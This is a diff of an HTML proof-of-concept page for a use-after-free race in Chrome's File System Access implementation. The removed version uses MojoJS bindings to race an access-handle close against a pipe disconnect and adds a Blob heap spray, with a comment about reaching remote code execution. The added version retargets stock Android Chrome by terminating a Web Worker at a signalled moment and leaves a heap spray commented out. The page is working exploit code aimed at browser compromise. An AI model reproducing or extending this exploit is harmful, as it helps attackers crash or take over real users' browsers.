@@ -1,77 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MojoJS UAF PoC - FileSystemAccessManager</title>
+    <title>FileSystemAccess UAF PoC (Stock Chrome)</title>
 </head>
 <body>
-    <h1>MojoJS Race Condition Trigger</h1>
-    <p>Open Console (F12) to see the logs.</p>
+    <h1>Standard Web API Race Trigger</h1>
+    <p>Testing on stock Android Chrome via OPFS and Web Workers.</p>
     <button id="trigger">Trigger UAF</button>
 
-    <script type="module">
-        // Note: You must have the .mojom.js files in the same directory structure
-        // as your server. You can find these in the 'gen' directory of a Chromium build.
-        import { FileSystemAccessManagerRemote } from './gen/third_party/blink/public/mojom/file_system_access/file_system_access_manager.mojom.js';
-        import { FileSystemAccessPermissionMode } from './gen/third_party/blink/public/mojom/file_system_access/file_system_access_manager.mojom-shared.js';
+    <script>
+        document.getElementById('trigger').onclick = async () => {
+            console.log("[*] Spawning Web Worker...");
+            
+            // Spawn the worker
+            const worker = new Worker('worker.js');
 
-        async function triggerUAF() {
-            console.log("[*] Initializing MojoJS...");
-
-            try {
-                // 1. Setup Manager
-                const manager = new FileSystemAccessManagerRemote();
-                Mojo.bindInterface('blink.mojom.FileSystemAccessManager', 
-                                   manager.$.bindNewPipeAndPassReceiver().handle);
-
-                console.log("[*] Requesting Sandboxed File System...");
-                const { result, directory } = await manager.getSandboxedFileSystem();
-                
-                if (result.status !== 0) {
-                    console.error("[-] Failed to get FS:", result);
-                    return;
+            // Listen for the exact moment to strike
+            worker.onmessage = (e) => {
+                if (e.data === "RACE_NOW") {
+                    console.log("[*] Received signal. Terminating worker instantly!");
+                    
+                    // This is the kill shot. Terminating the worker instantly severs
+                    // the Mojo Receiver pipe on the Browser process side, triggering
+                    // the disconnect handler while the Async Task A is still running.
+                    worker.terminate();
+                    
+                    console.log("[+] Worker terminated. Mojo pipe dropped. Browser should crash in std::set::find().");
+                    
+                    // Spray the heap here to catch the freed object
+                    // sprayHeap();
                 }
-
-                // 2. Create a file to get a handle
-                console.log("[*] Creating file 'pwn.txt'...");
-                const { result: fileResult, file } = await directory.getFile("pwn.txt", { create: true });
-
-                // 3. Open the Access Handle
-                // This creates the FileSystemAccessAccessHandleHostImpl on the Browser side
-                console.log("[*] Opening Access Handle...");
-                const { result: ahResult, accessHandleHost } = await file.openAccessHandle({ 
-                    mode: 1 // kReadWrite
-                });
-
-                if (!accessHandleHost) {
-                    console.error("[-] Could not get AccessHandleHost");
-                    return;
-                }
-
-                console.log("[*] Host obtained. Executing race...");
-
-                // 4. TRIGGER THE RACE
-                // Send the Close call (Task A)
-                accessHandleHost.close();
-
-                // Immediately drop the pointer (Task B - Disconnect Handler)
-                // This calls RemoveAccessHandleHost a second time while Task A is pending
-                accessHandleHost.$.close(); 
-
-                console.log("[+] Race triggered. Browser process should crash/UAF now.");
-
-                // 5. Heap Grooming placeholder
-                // To actually get RCE, you'd spray objects here to occupy 
-                // the freed memory before the second task fires.
-                for (let i = 0; i < 500; i++) {
-                    new Blob([new Uint8Array(0x160).fill(0x41)]); // Sample spray
-                }
-
-            } catch (e) {
-                console.error("[-] Error during exploit:", e);
-            }
-        }
-
-        document.getElementById('trigger').onclick = triggerUAF;
+            };
+        };
     </script>
 </body>
 </html>
